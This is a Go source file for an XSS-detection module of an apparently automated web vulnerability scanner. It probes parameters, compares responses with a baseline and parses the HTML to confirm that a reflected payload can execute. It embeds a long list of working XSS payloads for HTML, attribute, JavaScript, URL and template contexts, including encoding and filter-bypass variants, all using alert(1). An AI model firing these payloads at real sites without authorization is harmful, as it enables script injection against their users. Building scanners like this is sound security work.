package modules

import (
	"context"
	"fmt"
	"strings"

	"github.com/akha-security/akca/engine/internal/oast"
	"github.com/akha-security/akca/engine/internal/payloadgen"
	"github.com/akha-security/akca/engine/internal/reflection"
	"github.com/akha-security/akca/engine/internal/verification"
	"golang.org/x/net/html"
)

func (r *Runner) runXSS(ctx context.Context, target ScanTarget) []ModuleFinding {
	if strings.TrimSpace(target.Parameter) == "" {
		return nil
	}
	var out []ModuleFinding
	baseline, err := r.probeForModule(ctx, "xss", target, "akca-xss-base")
	if err != nil {
		baseline, err = r.cachedEmptyProbe(ctx, target)
		if err != nil {
			r.emitSkip("xss", target, "baseline and empty-request fallback failed: "+err.Error())
			return nil
		}
	}
	probes := payloadsForClass(target.Payloads.Payloads, "xss")
	if len(probes) == 0 {
		probes = defaultXSSProbes()
	}
	for _, p := range probes {
		if p.IsControl || p.IsNegativeControl {
			continue
		}
		attempts := r.injectionProbeAttemptsForModule(ctx, "xss", target, p.Value)
		attempt := pickBodyDiffAttempt(attempts, baseline.Response.Body)
		if len(attempts) == 0 {
			continue
		}
		rr := attempt.RR
		probeTarget := attempt.Target
		if probeTarget.EndpointURL == "" {
			probeTarget = target
		}
		signal := detectXSSSignal(p, rr.Response.Body, baseline.Response.Body)
		if signal == "" {
			continue
		}
		if !xssSignalConfirmed(p, rr.Response.Body, baseline.Response.Body, signal) {
			continue
		}
		oastURL := ""
		domPresent := verification.CheckDOMPresence(rr.Response.Body, p.Value)
		domExecuted := false
		domPayload := verification.DOMXSSPayload()
		domRR, domErr := r.probeForModule(ctx, "xss", target, domPayload)
		if domErr == nil && r.browser != nil && domRR.Request.Method == "GET" && domRR.Request.URL != "" {
			rendered, renderErr := r.browser.Render(ctx, domRR.Request.URL)
			domExecuted = renderErr == nil && verification.CheckDOMExecution(rendered)
		}
		if domExecuted && !sqliErrorRe.MatchString(domRR.Response.Body) {
			p = defaultPayload("xss", "browser_dom_canary", domPayload, "dom_execution")
			rr = domRR
			probeTarget = target
			domPresent = verification.CheckDOMPresence(domRR.Response.Body, domPayload)
			signal = "dom_execution"
		}
		marker := ""
		if target.Profile.Stable && target.Profile.ReflectionKind == reflection.ReflectionRaw {
			marker = fmt.Sprintf("akca-stored-%s-%s", target.Parameter, r.scanID)
			r.trackStoredMarker(target.EndpointURL, target.Parameter, marker)
			if signal == "reflected" {
				signal = "stored_tracking"
			}
		}
		// DOM presence/execution scoring is only for the DOM-XSS path. A raw,
		// executable reflected payload is already validated by the HTML parser;
		// treating that ordinary reflection as "DOM presence only" would apply
		// an unrelated false-positive penalty.
		domSignalPresent := domPresent && signal == "dom_execution"
		f := r.verifyAndBuild(ctx, "xss", probeTarget, p, baseline, rr, signal, domSignalPresent, domExecuted, oastURL, marker)
		if f != nil {
			if r.recordFinding(ctx, &out, f, "xss", signal) {
				return out
			}
		}
	}
	return out
}

func detectXSSSignal(p payloadgen.Payload, body, baseline string) string {
	if strings.Contains(body, p.Value) && !strings.Contains(baseline, p.Value) {
		if xssExecutableReflection(body, p.Value) && !xssExecutableReflection(baseline, p.Value) {
			return "reflected"
		}
	}
	enc := htmlEncodeSimple(p.Value)
	if enc != p.Value && strings.Contains(body, enc) && !strings.Contains(baseline, enc) {
		return "reflected_encoded"
	}
	if verification.CheckDOMExecution(body) && !verification.CheckDOMExecution(baseline) {
		return "dom_execution"
	}
	return ""
}

func xssExecutableReflection(body, payload string) bool {
	if payload == "" || !strings.Contains(body, payload) {
		return false
	}
	doc, err := html.Parse(strings.NewReader(body))
	if err != nil {
		return strings.Contains(body, payload)
	}
	lowerPayload := strings.ToLower(payload)
	var walk func(*html.Node) bool
	walk = func(n *html.Node) bool {
		if n.Type == html.ElementNode {
			tag := strings.ToLower(n.Data)
			if tag == "textarea" || tag == "style" || tag == "title" || tag == "plaintext" || tag == "xmp" || tag == "noembed" || tag == "noframes" {
				if strings.Contains(strings.ToLower(nodeText(n)), lowerPayload) && !strings.Contains(lowerPayload, "</"+tag) {
					return false
				}
			}
			for _, attr := range n.Attr {
				name := strings.ToLower(attr.Key)
				value := strings.ToLower(attr.Val)
				if strings.HasPrefix(name, "on") {
					if strings.Contains(value, lowerPayload) || strings.Contains(lowerPayload, name) || (value != "" && strings.Contains(lowerPayload, value)) {
						return true
					}
				}
				if (name == "href" || name == "src" || name == "action" || name == "formaction" || name == "data" || name == "xlink:href" || name == "srcdoc") &&
					(strings.HasPrefix(strings.TrimSpace(value), "javascript:") || strings.HasPrefix(strings.TrimSpace(value), "data:text/html")) {
					if strings.Contains(value, lowerPayload) || strings.Contains(lowerPayload, "javascript:") || strings.Contains(lowerPayload, "data:text/html") {
						return true
					}
				}
			}
			if tag == "script" || tag == "svg" || tag == "img" || tag == "iframe" || tag == "details" ||
				tag == "audio" || tag == "video" || tag == "math" || tag == "object" || tag == "embed" ||
				tag == "marquee" {
				if strings.Contains(lowerPayload, "<"+tag) {
					return true
				}
				inner := strings.ToLower(nodeInnerHTML(n))
				outer := strings.ToLower(nodeOuterHTML(n))
				text := strings.ToLower(nodeText(n))
				if strings.Contains(inner, lowerPayload) || strings.Contains(outer, lowerPayload) || strings.Contains(text, lowerPayload) {
					return true
				}
			}
		}
		for child := n.FirstChild; child != nil; child = child.NextSibling {
			if walk(child) {
				return true
			}
		}
		return false
	}
	return walk(doc)
}

func nodeText(n *html.Node) string {
	var b strings.Builder
	var walk func(*html.Node)
	walk = func(cur *html.Node) {
		if cur.Type == html.TextNode {
			b.WriteString(cur.Data)
		}
		for child := cur.FirstChild; child != nil; child = child.NextSibling {
			walk(child)
		}
	}
	walk(n)
	return b.String()
}

func nodeInnerHTML(n *html.Node) string {
	var b strings.Builder
	for child := n.FirstChild; child != nil; child = child.NextSibling {
		html.Render(&b, child)
	}
	return b.String()
}

func nodeOuterHTML(n *html.Node) string {
	var b strings.Builder
	html.Render(&b, n)
	return b.String()
}

func htmlEncodeSimple(s string) string {
	r := strings.NewReplacer("<", "&lt;", ">", "&gt;", `"`, "&quot;", "'", "&#39;")
	return r.Replace(s)
}

// defaultXSSProbes includes specialized context-aware payload categories inspired by DalFox
func defaultXSSProbes() []payloadgen.Payload {
	values := []struct {
		variant, value, signal string
	}{
		// Core Reflection & DOM Payloads
		{"html_img_onerror", `<img src=x onerror=alert(1)>`, "dom_mutation"},
		{"html_svg_onload", `"><svg/onload=alert(1)>`, "dom_mutation_svg"},
		{"poly_script_break", `</script><svg/onload=alert(1)>`, "script_breakout"},
		{"poly_attr", `" onfocus=alert(1) autofocus="`, "event_handler"},
		{"poly_js", `';alert(1)//`, "js_execution"},
		{"poly_body", `<body onload=alert(1)>`, "dom_mutation"},
		{"poly_svg", `<svg/onload=alert(1)>`, "dom_mutation_svg"},
		{"poly_url", `javascript:alert(1)`, "url_scheme_execution"},

		// 1. inHTML Context Probes (HTML5 / Audio / Video / Marquee / MathML / Objects)
		{"html_body_pageshow", `<body onpageshow=alert(1)>`, "dom_mutation"},
		{"html5_details_toggle", `<details open ontoggle=alert(1)>`, "dom_mutation"},
		{"html5_video_onerror", `<video><source onerror=alert(1)>`, "dom_mutation"},
		{"html5_audio_onerror", `<audio src onerror=alert(1)>`, "dom_mutation"},
		{"html5_marquee", `<marquee onstart=alert(1)>`, "event_handler"},
		{"svg_animate", `<svg><animate onbegin=alert(1) attributeName=x>`, "dom_mutation_svg"},
		{"svg_set", `<svg><set onbegin=alert(1) attributeName=x>`, "dom_mutation_svg"},
		{"mathml_xss", `<math><mtext><img src=x onerror=alert(1)>`, "dom_mutation"},
		{"iframe_srcdoc", `<iframe srcdoc="<script>alert(1)</script>">`, "dom_mutation"},
		{"object_data_xss", `<object data="javascript:alert(1)">`, "url_scheme_execution"},
		{"embed_src_xss", `<embed src="javascript:alert(1)">`, "url_scheme_execution"},
		{"form_data_xss", `<form onformdata=alert(1)><button>`, "event_handler"},

		// 2. inATTR Context Probes (Single quote, Double quote, Unquoted, Breakouts)
		{"attr_dquote_break", `"><svg/onload=alert(1)>`, "dom_mutation_svg"},
		{"attr_squote_break", `'><svg/onload=alert(1)>`, "dom_mutation_svg"},
		{"attr_dquote_focus", `" onfocus=alert(1) autofocus="`, "event_handler"},
		{"attr_squote_focus", `' onfocus=alert(1) autofocus='`, "event_handler"},
		{"attr_unquoted_focus", `x onfocus=alert(1) autofocus`, "event_handler"},
		{"attr_pointer_enter", `" onpointerenter=alert(1) "`, "event_handler"},
		{"attr_mouse_over", `" onmouseover=alert(1) "`, "event_handler"},
		{"attr_onclick", `" onclick=alert(1) "`, "event_handler"},
		{"attr_style_anim", `" style="animation-name:x" onanimationstart=alert(1) "`, "event_handler"},
		{"html5_input_focus", `<input onfocus=alert(1) autofocus>`, "event_handler"},
		{"html5_select_focus", `<select onfocus=alert(1) autofocus>`, "event_handler"},

		// 3. inJS Context Probes (JavaScript String / Template / Closure Breakouts)
		{"js_poly_script_break", `</script><svg/onload=alert(1)>`, "script_breakout"},
		{"js_squote_break", `';alert(1)//`, "js_execution"},
		{"js_dquote_break", `";alert(1)//`, "js_execution"},
		{"js_arith_squote", `'-alert(1)-'`, "js_execution"},
		{"js_arith_dquote", `"-alert(1)-"`, "js_execution"},
		{"js_backslash_break", `\';alert(1)//`, "js_execution"},
		{"js_closure_break", `});alert(1);({`, "js_execution"},
		{"template_literal", "${alert(1)}", "js_execution"},
		{"backtick_template", "`${alert(1)}`", "js_execution"},
		{"backtick_arith", "`+alert(1)+`", "js_execution"},

		// 4. inURL Context Probes
		{"url_javascript_scheme", `javascript:alert(1)`, "url_scheme_execution"},
		{"url_javascript_newline", `javascript:%0aalert(1)`, "url_scheme_execution"},
		{"url_data_scheme", `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`, "url_scheme_execution"},

		// 5. inComment Context Probes
		{"comment_break_std", `--> <svg/onload=alert(1)>`, "dom_mutation_svg"},
		{"comment_break_html5", `--!> <svg/onload=alert(1)>`, "dom_mutation_svg"},

		// 6. Client-Side Template Injection (Angular, Vue, CSTI)
		{"angular_template", `{{constructor.constructor('alert(1)')()}}`, "dom_mutation"},
		{"angular_ng_template", `{{$eval('alert(1)')}}`, "dom_mutation"},

		// 7. DalFox Encoding Suite (HTML Entities, Protocol Obfuscation, Atob, FromCharCode, Unicode, Double URL)
		{"enc_hex_entity_img", "&#x3c;img src=x onerror=alert(1)&#x3e;", "dom_mutation"},
		{"enc_dec_entity_svg", "&#60;svg onload=alert(1)&#62;", "dom_mutation_svg"},
		{"enc_proto_tab", "jav&#x09;ascript:alert(1)", "url_scheme_execution"},
		{"enc_proto_newline", "jav&#x0A;ascript:alert(1)", "url_scheme_execution"},
		{"enc_proto_full_entity", "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)", "url_scheme_execution"},
		{"enc_atob_eval", `eval(atob('YWxlcnQoMSk='))`, "js_execution"},
		{"enc_charcode_eval", `eval(String.fromCharCode(97,108,101,114,116,40,49,41))`, "js_execution"},
		{"enc_arrow_constructor", `(()=>{})['constructor']('alert(1)')()`, "js_execution"},
		{"enc_filter_constructor", `[].filter.constructor('alert(1)')()`, "js_execution"},
		{"enc_unicode_script", `\u003cscript\u003ealert(1)\u003c/script\u003e`, "script_breakout"},
		{"enc_unicode_js_squote", `\u0027-alert(1)-\u0027`, "js_execution"},
		{"enc_double_url_dquote", `%2522%2520onfocus%253Dalert(1)%2520autofocus%253D%2522`, "event_handler"},
	}
	out := make([]payloadgen.Payload, 0, len(values))
	for _, v := range values {
		out = append(out, payloadgen.Payload{
			Value: v.value, VulnClass: "xss", Variant: v.variant, Family: "xss",
			ExpectedSignal: v.signal,
		})
	}
	return out
}

var _ OASTClient = (*oast.Listener)(nil)
